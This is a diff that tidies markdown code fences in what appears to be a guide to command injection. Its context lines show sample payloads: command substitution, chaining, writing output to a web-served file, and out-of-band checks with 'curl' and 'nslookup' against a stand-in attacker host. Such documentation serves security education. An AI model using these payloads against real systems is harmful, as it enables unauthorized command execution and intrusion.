@@ -130,11 +130,7 @@ Command substitution allows the output of one command to be used as input to ano
 
 Examples:
 
-
-```
-
 ```bash
-
 $(whoami)
 `whoami`
 ```
@@ -145,11 +141,7 @@ Multiple commands can be executed sequentially using command chaining operators.
 
 Examples:
 
-
-```
-
 ```bash
-
 cmd1 ; cmd2
 cmd1 && cmd2
 cmd1 || cmd2
@@ -161,11 +153,7 @@ Attackers may redirect command output to files accessible by the web server.
 
 Example:
 
-
-```
-
 ```bash
-
 whoami > /var/www/html/output.txt
 ```
 
@@ -175,10 +163,7 @@ Attackers may use external services to detect command execution.
 
 Examples:
 
-
-```
 ```bash
-
 curl http://attacker.com
 nslookup attacker.com
 ```
